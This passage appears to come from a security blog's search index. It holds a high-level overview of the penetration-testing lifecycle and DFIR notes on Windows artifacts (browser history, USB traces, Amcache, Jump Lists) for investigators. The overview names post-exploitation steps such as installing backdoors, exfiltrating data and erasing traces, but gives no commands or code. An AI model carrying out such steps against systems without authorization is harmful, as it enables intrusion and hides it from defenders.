scanning, service identification, and password cracking. Exploitation: In this stage, the hacker attempts to exploit identified vulnerabilities to gain access to the target system or network. This may include activities such as SQL injection, buffer overflow attacks, and malware injection. Post-exploitation: Once the hacker has gained access to the target system or network, they may perform additional actions, such as installing backdoors, escalating privileges, or exfiltrating data. Reporting and remediation: The final stage of the ethical hacking process involves documenting the findings and recommendations for remediation, and presenting them to the relevant parties.It’s worth noting that the specific steps and techniques used in an ethical hacking engagement may vary depending on the specific goals and constraints of the engagement. However, following a structured process such as this can help ensure that all relevant areas are covered and that appropriate mitigation measures are put in place. The MITRE ATT&amp;CK Enterprise Matrix is a useful resource for identifying potential threats and developing strategies for detection and response.Planning and ReconnaissancePlanning and reconnaissance is the first stage of an ethical hacking process, and it involves gathering information about the target system or network. Some specific steps that may be involved in this stage include: Defining the scope: This involves determining the boundaries of the engagement, including the target systems or networks, the types of vulnerabilities to be tested, and any constraints or limitations. Gather intelligence: This involves collecting information about the target system or network, including its infrastructure, technology, and security measures. This may involve activities such as network scanning, vulnerability assessments, and social engineering. Identify vulnerabilities: This involves identifying potential vulnerabilities in the target system or network, such as software vulnerabilities, weak passwords, or misconfigured systems. Develop a plan: This involves creating a detailed plan for the rest of the engagement, including the specific tools and techniques that will be used and the sequence in which they will be applied. Obtain authorization: This involves obtaining the necessary permission and approvals to conduct the engagement, including any required legal or ethical clearance.By thoroughly planning and preparing for the engagement, the hacker can ensure that they have the necessary information and resources to effectively test the target system or network.Scanning and EnuermationScanning and enumeration is the second stage of an ethical hacking process, and it involves using tools and techniques to identify vulnerabilities and gather further information about the target system or network. Some specific steps that may be involved in this stage include: Port scanning: This involves using a tool to scan the target system or network for open ports, which can indicate the presence of services or applications that may be vulnerable to attack. Service identification: This involves identifying the specific services or applications running on the target system or network, and determining their version numbers and any known vulnerabilities. Vulnerability scanning: This involves using a tool to scan the target system or network for known vulnerabilities, such as software vulnerabilities or misconfigured systems. Password cracking: This involves attempting to guess or crack passwords for accounts on the target system or network. This may be done using tools that perform dictionary attacks, brute force attacks, or other methods. Enumeration: This involves gathering additional information about the target system or network, such as user names, group memberships, and other details that may be useful for further exploitation.By thoroughly scanning and enumerating the target system or network, the hacker can identify potential vulnerabilities and gather the necessary information to plan and execute an exploitation attempt.ExploitationExploitation is the third stage of an ethical hacking process, and it involves attempting to exploit identified vulnerabilities to gain access to the target system or network. Some specific steps that may be involved in this stage include: Identify a vulnerability: This involves identifying a specific vulnerability in the target system or network that can be exploited to gain access. Develop an exploit: This involves creating or obtaining a piece of code or technique that can be used to exploit the identified vulnerability. Test the exploit: This involves testing the exploit to ensure that it works as intended and to identify any potential issues or limitations. Execute the exploit: This involves running the exploit against the target system or network to gain access. Confirm access: This involves verifying that the exploit was successful and that the hacker has gained access to the target system or network.By successfully exploiting a vulnerability, the hacker can gain access to the target system or network and proceed to the next stage of the engagement. It’s worth noting that not all vulnerabilities can be exploited, and it may be necessary to try multiple exploits or to pivot to other vulnerabilities in order to gain access.Post-ExploitationPost-exploitation is the fourth stage of an ethical hacking process, and it involves performing additional actions once access has been gained to the target system or network. Some specific steps that may be involved in this stage include: Maintain access: This involves ensuring that the hacker retains access to the target system or network, and may involve installing backdoors or other persistence mechanisms. Escalate privileges: This involves attempting to increase the hacker’s level of access or privileges on the target system or network, such as by cracking or guessing administrator passwords or by exploiting privilege escalation vulnerabilities. Exfiltrate data: This involves transferring data out of the target system or network, such as by copying files or extracting database records. Perform additional actions: This may involve performing additional activities on the target system or network, such as installing malware or modifying system configurations. Clean up: This involves removing any traces of the hacker’s presence on the target system or network, including deleting any files or tools that were used during the engagement.By performing these actions, the hacker can gather additional information about the target system or network and potentially gain further access or control. It’s important to carefully consider the potential consequences of these actions and to ensure that they are in line with the goals and constraints of the engagement.Reporting and RemediationReporting and remediation is the final stage of an ethical hacking process, and it involves documenting the findings and recommendations for remediation, and presenting them to the relevant parties. Some specific steps that may be involved in this stage include: Document findings: This involves creating a report detailing the vulnerabilities that were identified during the engagement, including their severity and potential impact. Recommend remediation: This involves suggesting actions that can be taken to mitigate the identified vulnerabilities, such as applying patches, changing configurations, or implementing additional security controls. Present findings: This involves presenting the report and recommendations to the relevant parties, such as the client or the organization’s security team. Verify remediation: This involves verifying that the recommended remediation actions have been implemented and that the vulnerabilities have been effectively mitigated.By thoroughly documenting the findings and recommendations, the hacker can help the relevant parties understand the risks and vulnerabilities that exist in their systems and networks, and take appropriate action to mitigate them. This can help improve the overall security posture of the target system or network.Sources EC-Council - Ethical Hacking" }, { "title": "Evidence of Network and Browser History", "url": "/posts/DFIR_Evidence_of_Network_and_Browser_History/", "categories": "DFIR, Evidence Artifacts", "tags": "cookies, evtx:wlan, srum", "date": "2022-09-11 00:00:00 +1000", "snippet": "Techniques that can be used to discover evidence in support of an assets physical location, network connectivity and web browser history post-breach. More useful in investigation relating to insider threat or more commonly during the COVID Pandemic, attacks originating from employees working away from the office.WindowsTimezoneIdentification of the systems timezone can grant information that could indicate the an assets physical locale.WIN: XP+ SRV: 2003+LocationHKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformationInterpretation and Investigative Notes Internal logs and DTG stamps will be based on the control set saved in the registry key. Other network sourced logs will need to be correlated for any time difference/skew.Tools Registry Explorer (RECmd)Sources Microsoft - HKLM\\System\\CurrentControlSet\\Control Registry TreeBrowser CookiesCookies give insight into which sites have been visited and the activities that occurred on the site.WIN: XP+ SRV: 2003+Location# INTERNET EXPLORER# Versions 6-10%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Cookies# Version 11%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\INetCookies# MOZILLA FIREFOX# WINDOWS XP%USERPROFILE%\\Application Data\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\cookies.sqlite# WINDOWS 7+%USERPROFILE%\\AppData\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\cookies.sqlite# GOOGLE CHROME# WINDOWS XP%USERPROFILE%\\Local Settings\\ApplicationData\\Google\\Chrome\\User Data\\Default\\Local Storage# WINDOWS 7+%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local StorageInterpretation and Investigative Notes Google Analytics (GA) has developed an extremely sophisticated methodology for tracking site visits, user activity, and paid search. Since GA is largely free, it has a commanding share of the market, estimated at over 80% of sites using traffic analysis and over 50% of all sites. _utma (Unique Visitors) Domain Hash Visitor ID Cookie Creation Time Time of 2nd most recent visit Time of most recent visit Number of visits _utmb (Session Tracking) Domain Hash Page views in current session Outbound link clicks Time current session started _utmz (Traffic Sources) Domain Hash last Update Time Number of visits Number of different types of visits Source used to access site Google AdWords campaign name Access Method (organic, referral, cpc, email, direct) Keyword used to find site (non-SSL only) Tools Registry Explorer (RECmd) Google Analytic Cookie Cruncher AZ4n6 - Google Analytic Cookie ParserSources Hacking Articles - Beginner Guide to Understanding Cookies Session Management Acquire Forensics - Google Chrome Browser Forensics Google - Analytics Hats Off Security - Google Analytic CookiesWLAN Event LogDetermine what wireless connections have been established, displays SSID.WIN: 7+ SRV: Not TestedLocationMicrosoft-Windows-WLAN-AutoConfig Operational.evtxInterpretation and Investigative Notes Event IDs 11000: Wireless network association started 8001: Successful connection to wireless network 8002: Failed connection to wireless network 8003: Disconnect from wireless network 6100: Network diagnostics (System.evtx) Tools Event Log Explorer Event Log Parser (EvtxECmd) Native Event ViewerSources SANS - Making the out of WLAN Event LogBrowser Search TimesRecords websites visited by date and time. Details are stored for each local user account. Records the number of times visited (frequency) and also tracks access of local system files. Includes the website history of search terms in search engines.WIN: XP+ SRV: Not TestedLocation# INTERNET EXPLORER# Versions 6-7%USERPROFILE%\\Local Settings\\History\\History.IE5# Versions 8-9%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5# Versions 10-11%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV*.dat# MOZILLA FIREFOX# WINDOWS XP%USERPROFILE%\\Application Data\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\places.sqlite# WINDOWS 7/8/10%USERPROFILE%\\AppData\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\places.sqliteInterpretation and Investigative NotesTools SQLECmd Chromium Parser Mozilla Cache ParserSources Nasbench - Web Browser ForensicsSystem Resource Usage Monitor (SRUM)Records 30 to 60 days of historical system performance. Applications run, user account responsible for each, and application and bytes sent/received per application per hour.WIN: 8+ SRV: Not TestedLocationSOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\SRUM\\ExtensionsSOFTWARE\\Microsoft\\WlanSvc\\InterfacesC:\\Windows\\System32\\SRU\\Interpretation and Investigative Notes SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\SRUM\\Extensions Windows Network Data Usage Monitor {973F5D5C-xxxx-xxxx-xxxx-xxxxxxxxxxxx} Windows Network Connectivity Usage Monitor {DD6636C4-xxxx-xxxx-xxxx-xxxxxxxxxxxx} Tools Forensafe SRUM Parser (SrumECmd) SRUM DumpSources Velociraptor - Digging Into the System Resource Usage Monitor (SRUM)Browser CacheThe Browser cache is where web page components can be stored locally to speed up subsequent visits. It can be used to glean further information on what a user was actively looking at online. Providing the following information: Websites visited Files viewed on a website visited (caches files are linked to specific local accounts) Timestamps indicate when site was first saved and last accessed.WIN: XP+ SRV: Not TestedLocation# INTERNET EXPLORER# Versions 8-10%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5# Version 11%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE# Edge%USERPROFILE%\\AppData\\Local\\Packages\\microsoft.micosoftedge_&lt;APP ID&gt;\\AC\\MicrosoftEdge\\Cache# MOZILLA FIREFOX# WINDOWS XP%USERPROFILE%\\Application Data\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\cache# WINDOWS 7+%USERPROFILE%\\AppData\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\cache# GOOGLE CHROME# WINDOWS XP%USERPROFILE%\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Cache\\ - data_# and f_####### WINDOWS 7+%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache- data_# and f_######Interpretation and Investigative NotesTools SQLECmd Chromium Parser Mozilla Cache Parser Microsoft Edge Dev ToolsSources Nasbench - Web Browser Forensics Acquire Forensics - Google Chrome Browser ForensicsFlash and Super CookiesLocal Stored Objects (LSO’s), or Flash Cookies, have become ubiquitous on most systems due to the extremely high penetration of Flash applications across the internet. They tend to be much more persistent because they do not expire, and there is no built-in mechanisms within the browser to remove them. In fact, many sites have begun using LSOs for their tracking mechanisms because they rarely get cleared like traditional cookies.Provides the following information: Websites visited User account used to visit the site When cookie was created and last accessedWIN: 7+SRV: Not TestedLocation%APPDATA%\\Roaming\\Macromedia\\FlashPlayer#SharedObjects&lt;random_profile_id&gt;Interpretation and Investigative NotesTools SQLECmd Chromium Parser Mozilla Cache Parser Microsoft Edge Dev ToolsSources Nasbench - Web Browser Forensics Forensics From the Sausage Factory - Adobe Flash Player Local Shared ObjectsSession RestoreAutomatic Crash Recovery features built into the browser.WIN: 7+SRV: Not TestedLocation# INTERNET EXPLORER%USERPROFILE%\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery# MOZILLA FIREFOX%USERPROFILE%\\AppData\\Mozilla\\Firefox\\Profiles&lt;RANDOM-TEXT&gt;.default\\sessionstore.js# GOOGLE CHROME%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Interpretation and Investigative Notes Historical Websites viewed in each tab Referring Websites Time session ended Modified time of .dat files in LastActive folder Time each tab opened (only when crash occurred) Creation time of .dat files in Active FolderTools SQLECmd Chromium Parser Mozilla Cache Parser Huge JSON ViewerSources Computer Forensics Parsonage - Web Browser Session Restore Forensics Acquire Forensics - Google Chrome Browser Forensics" }, { "title": "Evidence of Lateral Movement", "url": "/posts/DFIR_Evidence_of_Lateral_Movement/", "categories": "DFIR, Evidence Artifacts", "tags": "rdp, port:3389, evtx:security, lateral movement (TA0008)", "date": "2022-09-11 00:00:00 +1000", "snippet": "Techniques that can be used to discover evidence in support of lateral movement through a network using various techniques.WindowsRemote Desktop Protocol (RDP) UsageTrack RDP logins between remote machinesDarkcybe - Evidence Account Usage" }, { "title": "Evidence of File and Folder Interaction", "url": "/posts/DFIR_Evidence_of_File_and_Folder_Interaction/", "categories": "DFIR, Evidence Artifacts", "tags": "acmru, thumbcache, wordwheelquery, recycle bin, lastvisitedmru, opensavemru, jump list, shell bag, .lnk, prefetch, activitiescache", "date": "2022-09-11 00:00:00 +1000", "snippet": "Techniques that can be used to discover evidence in support of an attackers interaction with files and folders such as search, deletion and opening post-breach.WindowsXP Search (ACMRU)A wide variety of information can be searched for through the search assistant on a Windows XP Machine. The search assistant will remember a user’s search terms for filenames, computers, or words that are inside a file. This is an example of where you can find the “Search History” on the Windows system.WIN: XP SRV: NULLLocationNTUSER.DAT\\Software\\Microsoft\\Search Assistant\\ACMru\\####Interpretation and Investigative Notes Search the Internet ####-5001 All or part of a document name ####-5603 A word or phrase within a document ####-5604 Printers, computers, or people ####-5647 Tools Registry Explorer (RECmd)Sources Forensics Wiki - List of Windows MRU LocationsThumbCache.dbThumbnails of pictures, office documents, and folders exist in a database called the thumbcache. Each user will have their own database based on the thumbnail sizes viewed by the user (small, medium, large, and extra large)WIN: XP+ SRV: 2003+LocationC:%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\ExplorerInterpretation and Investigative Notes Created when a user switches a folder to thumbnail mode or views pictures via a slide show. As it were, our thumbs are now stored in separate database files. The thumbnail will store the thumbnail copy of the picture based on the thumbnail size in the content of the equivalent database file (Small, Medium, Large, and Extra Large)Tools ThumbCache Viewer)Sources GHacks - Thumbnail Cache Files WindowsThumbs.dbHidden file in directory where images on a machine exist stored in a smaller thumbnail graphic. Thumbs.db catalogs pictures in a folder and stores a copy of the thumbnail even if the pictures were deleted.WIN: XP+ SRV: 2003+Location# WINDOWS XP-8Automatically created anywhere with home group enabled# WINDOWS 7+Automatically created anywhere and accessed via a UNC Path (local or remote)Interpretation and Investigative Notes The database includes information such as: Thumbnail Picture of Origin Picture Document Thumbnail - Even if Deleted Last Modification Time (XP Only) Original Filename (XP Only) Tools MiTeC FTK ToolkitSources PCWorld - Manage Thumbs DB Files in Windows and on the Network Discovery Forensics - Caught You Looking! ThumbCache DatabasesInternet Explorer (IE) and Edge File HistoryA little-known fact about the IE and Edge History is that the information stored is not just related to Internet browsing. The history also contains records of local and remote network share file access, giving us an excellent means for determining which files and applications were accessed on the system, day by day.WIN: XP+ SRV: 2003+Location# INTERNET EXPLORER# Version 6/7%USERPROFILE%\\LocalSettings\\History\\History.IE5# Version 8/9%USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsHistory\\History.IE5# Version 10/11%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV*.dat# EDGE%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\History\\Low\\History.IE5&gt;Interpretation and Investigative Notes Stored in index.dat as: file:///C:/directory/filename.ext Does not prove that the file was opened by the browserTools Pasco2 Windows Index.dat ParserSources Defend The Web - Internet Explorer Forensic Investigation Forensics Wiki - Internet Explorer History File FormatSearch WordWheelQueryKeywords search for from the START menu bar.WIN: 7+ SRV: 2003+LocationNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQueryInterpretation and Investigative Notes Keywords are added in Unicode and listed in temporal order in an MRUlist.Tools Registry ExplorerSources Forensafe - Investigating Searched StringsRecycle BinThe recycle bin is a very important location on a Windows file system system to understand. It can help you when accomplishing a forensics investigation, as every file that is deleted from a Windows Recycle Bin aware program is generally first put in the Recycle Bin.WIN: XP+ SRV: 2003+Location# WINDOWS XPC:\\Recycler\" 2000/NT/XP/2003# WINDOWS 7+C:$Recycle.binDeleted Time and Original Filename contained in separate files for each deleted recovery fileInterpretation and Investigative Notes WINDOWS XP Subfolder is created with user’s SID and can be mapped to user Maps file name to the actual name and path it was deleted from Hidden file in directory called INFO2 contains Deleted Time and Original Filename Filename in both ASCII and UNICODE WINDOWS 7+ Subfolder is created with user’s SID and can be mapped to user Deleted Time and Original Filename contained in separate files for each deleted recovery file Filenames proceeded by $I######, contain: Original PATH and name Deletion Date/Time Filenames proceeded by $R######, contain: Recovery Data Tools Recycle Bin Artifact Parser (RBCmd) Trash Inspection and Analysis (TIA)Sources Forensically Fit - Windows Recycle Bin ForensicsLastVisitedMRUTracks the specific executable used by an application to open files documented in the OpenSaveMRU key. In addition, each value also tracks the directory location for the last file that was access by that application.Darkcybe - Evidence of ExecutionOpenSaveMRUTracks files that have been opened or saved within a Windows shell dialog box. This happens to be a big data set, not only including web browsers like Internet Explorer and Firefox, but also a majority of commonly used applications.Darkcybe - Evidence of DownloadRecent FilesRegistry Key that will track the last files and folder opened and is used to populate data in “recent” menus of the Start Menu.WIN: XP+ SRV: Not TestedLocationNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocsInterpretation and Investigative Notes RecentDocs Overall key will track the overall order of the last 150 files or folders opened. MRU list will keep track of the temporal order in which each file/folder was opened. Includes last entry time which mirrors the last opening time. The .%%% key (Three Letter Extension) Stores file opening operations based of a specific extension in temporal order. Folder Stores folder access based on opening in temporal order. Tools Registry ExplorerSources Forensic4cast - The Recentdocs Key in Windows 10Jump ListsThe Windows task bar (Jump List) is engineered to allow users to “jump” or access items they have frequently or recently used quickly and easily. This functionality cannot only include recent media files; it must also include recent tasks.The data stored in the AutomaticDestinations folder will each have a unique file prepended with the AppID of the associated application on Windows 7 through 10 machines. Windows 11 contains a shortcut (.LNK) files that direct to the application, file, or directory.Darkcybe - Evidence of ExecutionShell BagsWhich folders were accessed on the local machine, the network and/or removable devices. Evidence of previously existing folders after deletion/overwrite. When certain folders are created.WIN: XP+ SRV: Not TestedLocation# Access via ExplorerUSRCLASS.DAT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagsUSRCLASS.DAT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagsMRU# Access via DesktopNTUSER.DAT\\Software\\Microsoft\\Windows\\Shell\\BagsNTUSER.DAT\\Software\\Microsoft\\Windows\\Shell\\BagsMRUInterpretation and Investigative NotesTools Registry Explorer Shell Bags Explorer Windows Shell Bag ParserSources CE Digital Forensics - Shellbag AnalysisShortcut Files (.LNK)Shortcut files automatically created by windows when accessing recent items and opening local and remote data files and documents. Windows 11 contains a shortcut (.LNK) files that direct to the application, file, or directory.WIN: XP+ SRV: Not TestedLocation# WINDOWS XPC:%USERPROFILE%\\Recent# WINDOWS 7+C:%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\C:%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Office\\Recent\\Interpretation and Investigative Notes Although the locations listed are the default, they can be created anywhere. Date/Time file of that name was first opened Creation Date of .LNK file Date/Time file of that name was last opened Last Modification Date of .LNK file LNKTarget File (Internal LNK file details) Details: Modified, Accessed and creation times of target file Volume information Network Share information Original location Name of system Tools LNK Explorer (LECmd) Windows LNK Parsing UtilitySources Magnet Forensics - Forensic Analysis of LNK FilesPrefetchIncreases performance of a system by pre-loading code pages of commonly used applications. Cache Manager monitors all files and directories referenced for each application or process and maps them into a .pf file. Utilized to know an application was executed on a system. Limited to 128 files on XP and Windows 7 Limited to 1024 files on Windows 8 &lt;EXE_NAME&gt;-&lt;HASH&gt;.pfDarkcybe - Evidence of ExecutionMicrosoft Office Recent FilesMicrosoft Office programs will track their own recent files list to make it easier for users to remember the last file they were editing.WIN: XP+ SRV: Not TestedLocation# MICROSOFT OFFICE# Versions 10-14 (XP - 2010)NTUSER.DAT\\Software\\Microsoft\\Office\\VERSION# Version 15 (Office365)NTUSER.DAT\\Software\\Microsoft\\Office\\VERSION\\UserMRU\\LiveID_####\\FileMRUInterpretation and Investigative NotesSimilar to recent files, this will track the last files that were opened by each Microsoft Office application. The last entry added, per the MRU, will be the time the last file was opened by a specific application.Tools Registry ExplorerSources DF Stream - Microsoft Office ForensicsWindows Timeline (ActivitiesCache.db)Windows 10 introduced a background feature that records recently used applications and accessed files over a 30 day duration in a “timeline” accessible via the “WIN+TAB” key. The data is recorded in a SQLite database. Windows 11 removed the “WIN+TAB” functionality, however the ActivitiesCache.db still remains.Research identified that Windows Server 2016 also maintains an ActivitiesCache.db file, however ActivityOperation, Activity_PackageId, and Activity entries were not recorded.Darkcybe - Evidence of Execution" }, { "title": "Evidence of External Device Activity", "url": "/posts/DFIR_Evidence_of_External_Device_Activitity/", "categories": "DFIR, Evidence Artifacts", "tags": "", "date": "2022-09-11 00:00:00 +1000", "snippet": "Techniques that can be used to discover evidence in support of incidents where removeable devices were involved.WindowsUSB Key IdentificationTrack USB devices plugged into a machine.WIN: XP+ SRV: NULLLocationHKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTORHKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBInterpretation and Investigative Notes Identify vendor, product, and version of a USB device plugged into a machine. Identify a unique USB device plugged into the machine Determine the time a device was plugged into the machine Devices that do not have a unique serial number will have an “&amp;” in the second character of the serial number.Tools Registry Explorer (RECmd)Sources Magnet Forensics - Artifact Profile USB DevicesPlug and Play (PnP) EventsWhen a PnP driver is initiated, the service will log an event and provide status details. It is important to note that this event will trigger for any PnP device, USB, Firewire, PCMIA, etc.WIN: XP+ SRV: NULLLocation# WINDOWS XPC:\\Windows\\setupapi.log# WINDOWS 7+C:\\Windows\\setupapi.dev.logHKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\Ven_Prod_Ver\\USB_Serial_#\\Properties{83da6326-####-####-####-############}####%SYSTEM ROOT%\\System32\\winevt\\logs\\System.evtxInterpretation and Investigative Notes HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\Ven_Prod_Ver\\USB_Serial_#\\Properties{83da6326-####-####-####-############}#### Event IDs (Last portion of Registry Key entry as represented by \\####) 0064: First Install (Win7+) 0066: Last Connected (Win8+) 0067: Last Removal (Win8+) %SYSTEM ROOT%\\System32\\winevt\\logs\\System.evtx Event IDs 200001: PnP Driver Install Attempted Includes following information Timestamp Device Information Device Serial Number Status (0 = No Errors) Search for device serial number. Log files are set to local timesTools Registry Explorer (RECmd) Event Log Explorer Event Log Parser (EvtxECmd) Native Event ViewerSources Magnet Forensics - Artifact Profile USB DevicesAccount ResponsibleIdentify the user that used the USB deviceWIN: XP+ SRV: NULLLocationNTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2Interpretation and Investigative Notes Look for the GUID from the registry key below HKLM\\SYSTEM\\MountedDevices The above GUID will be used to identify the user that plugged in the device. The last write time of this key also corresponds to the last write time the device was plugged into the machine by that user. The number will be references in the number in the MountPoint registry key in the users NTUSER.DAT file.Tools Registry Explorer (RECmd)Sources Hats Off Security - USB Forensics Pt6 Which User Account Used the USB Device?Volume and Device Serial NumberDiscover the Volume Serial Number of the Filesystem Partition on the USB and the Unique Device Serial Number and Model.WIN: XP+ SRV: NULLLocationSoftware\\Microsoft\\WindowsNT\\CurrentVersion\\ENDMgmtInterpretation and Investigative Notes Use the Volume Name and USB Unique Serial Number to: Find last integer number in line Convert Decimal Serial Number into the Hex Serial Number Knowing both the Volume Serial Number and the Volume Name, you can correlate the data across SHORTCUT File (.LNK) analysis and the RECENTDOCs key. The .LNK file contains the Volume Serial Number and Name. The RECENTDOCs key will contain the Volume Name when the device was opened by Windows Explorer.Tools Registry Explorer (RECmd) PowerShell vol %Drive Letter%: WMI wmic diskdrive get Model, Name, InterfaceType, SerialNumberSources Get USB - How to Get USB Volume Serial Number and USB Device Serial NumberDrive Letter and Volume Name IdentificationDiscover the last drive letter of the USB Device when it was pluigged into the machine.WIN: XP+ SRV: Not TestedLocation# WINDOWS XP# Identify ParentIdPrefixHKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR# Use ParentIdPrefix to discover the last Mount PointHKLM\\SYSTEM\\MountedDevices# WINDOWS 7+Software\\Microsoft\\Windows Portable Devices\\DevicesHKLM\\SYSTEM\\MountedDevicesInterpretation and Investigative Notes Identify the USB device that was last mapped to a specific drive letter. This technique will only work for the last drive mapped. It does not contain historical records of every drive letter mapped to a removable drive.Tools Registry Explorer (RECmd)SourcesShortcut Files (.LNK)Shortcut files automatically created by windows when accessing recent items and opening local and remote data files and documents. Windows 11 contains a shortcut (.LNK) files that direct to the application, file, or directory.Darkcybe - Evidence of File and Folder Interaction" }, { "title": "Evidence of Execution", "url": "/posts/DFIR_Evidence_of_Execution/", "categories": "DFIR, Evidence Artifacts", "tags": "userassist, shimcache, appcompatcache, amcache, lastvisitedmru, ntuser.dat, activitiescache, recentapps, jump list, automaticdestinations, srum, prefetch, bam, dam, execution (TA0002), registry", "date": "2022-09-11 00:00:00 +1000", "snippet": "Techniques that can be used to discover evidence in support of program execution post-breach or during an attack.WindowsActivitiesCache.db (Windows Timeline)Windows 10 introduced a background feature that records recently used applications and accessed files over a 30 day duration in a “timeline” accessible via the “WIN+TAB” key. The data is recorded in a SQLite database. Windows 11 removed the “WIN+TAB” functionality, however the ActivitiesCache.db still remains.Research identified that Windows Server 2016 also maintains an ActivitiesCache.db file, however ActivityOperation, Activity_PackageId, and Activity entries were not recorded. Windows XP 7 8 10 11         Server 2003R2 2008R2 2012R2 2016 2019 2022           Location# Local AccountC:\\Users\\%PROFILE%\\AppData\\Local\\ConnectedDevicesPlatform\\L.%PROFILE%\\ActivitiesCache.db# Online AccountC:\\Users\\%PROFILE%\\AppData\\Local\\ConnectedDevicesPlatform\\%CID%\\ActivitiesCache.dbInterpretation and Investigative Notes Files within the L.%USERPROFILE% directory. ActivitiesCache.db: SQLite Database ActivitiesCache.db-wal: ‘Write ahead’ Log (Holds activity events prior to pushing them to the database - Reboot system to write to database) ActivitiesCache.db-shm: ‘Shared memory’ file The database contains evidence such as; ActivityType: Activity performed (ExecuteOpen, InFocus, CopyPaste, etc) Executable: Parent application used to open or execute file DisplayText: Title of file or application ContentInfo: Possible content information, not always present Timestamps: StartTime, EndTime, and Duration are some of the most interesting recorded events. Tools Darkcybe - WxTCmd ActivitiesCache Parser – Requires License Log2timeline (windows-timeline parser)Sources Kacos2000 - Windows Timeline Microsoft - Windows Activity History and Your Privacy Salt 4N6 - Windows 10 Timeline Forensic ArtifactsAmCache.hveProgramDataUpdater (a task associated with the Application Experience Service) uses the registry file Amcache.hve to store data during process creation. Details of program installation and execution are stored. Windows XP 7 8 10 11     Server 2003R2 2008R2 2012R2 2016 2019 2022           LocationC:\\Windows\\AppCompat\\Programs\\Amcache.hveInterpretation and Investigative Notes Amcache.hve - Keys = Amcache.hve\\Root\\File\\{Volume GUID}\\####### Entry for every executable run, full path information, files $StandardInfo Last Modification Time, and Disk Volume the executable was run from. First Run Time = Last Modification Time of key SHA1 hash of executable also contained in the key.Tools Darkcybe - AmCache Parser Get-ForensicAmcache) Log2timeline (amcache parser) Darkcybe - Registry ExplorerSources Andrea Fortuna - AmCache and Shimcache in Forensic AnalysisBackground Activity (BAM) and Desktop Activity Moderator (DAM)Windows BAM and DAM are updated when Windows boots and controls the activity of background applications and is found on all Windows devices and is managed by C:\\Windows\\System32\\drivers\\bam.sys. DAM is only populated with details of applications on Windows Tablets and Mobile devices although the empty registry key will be present on host devices.BAM and DAM entries are only stored during a session, with events clearing upon reboot or when entries have been present in the key for over 7 days. Another item to consider is that executables hosted on removable media are not recorded in the BAM or DAM. Windows XP 7 8 10 11         Server 2003R2 2008R2 2012R2 2016 2019 2022           Location# BAMHKLM\\System\\CurrentControlSet\\Services\\bam\\state\\UserSettings\\{SID}# DAMHKLM\\System\\CurrentControlSet\\Services\\dam\\state\\UserSettings\\{SID} CurrentControlSet may be substituted by ControlSet001 or ControlSet002. The ControlSet00x are alternating backups of the CurrentControlSet.Interpretation and Investigative NotesProvides full path of the executable file that was run on the system and the last time date time group of execution.Tools Darkcybe - Registry ExplorerSources Costas K - An Alternative to Prefetch -&gt; BAM DFIR.ru - BAM InternalsJump ListThe Windows task bar (Jump List) is engineered to allow users to “jump” or access items they have frequently or recently. This can include files, applications, and directories to name the major items of significance for forensic investigations.The data stored in the AutomaticDestinations directory contains a unique file for each application prepended with a unique Application ID (AppID) correlated to the associated application, such as the following example which depicts the AppID of Windows Explorer 8.1: f01b4d95cf55d32a.automaticDestinations-ms. Windows XP 7 8 10 11     Server 2003R2 2008R2 2012R2 2016 2019 2022       LocationC:%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinationsInterpretation and Investigative Notes The Jump List files contain information relating to program execution times, execution count and local file paths of the application being investigated. AppIDs are universally used across Windows and Server versions from 2007/2012 onwards. Correlations for common applications can be found here.Tools Darkcybe - JumpListExplorer (JLE) Windows Jump List Parser – Requires LicenseSources Superuser - What is a Jump List in Windows? DFRWS - Windows 10 Jump Lists and Link File Artifacts - Saved, Copied and MovedLastVisitedMRUThe LastVisitedMRU is responsible for tracking specific executables used by an application to open files documented under the OpenSaveMRU registry key. In addition, each value tracks the directory location for the last file that was accessed by that application. The information can provide forensic insight into an applications execution and file and folder interaction. Windows XP 7 8 10 11       Server 2003R2 2008R2 2012R2 2016 2019 2022   Location# WINDOWS: XP# SERVER: 2003NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDIg32\\LastVisitedMRU# WINDOWS: 7+# SERVER: 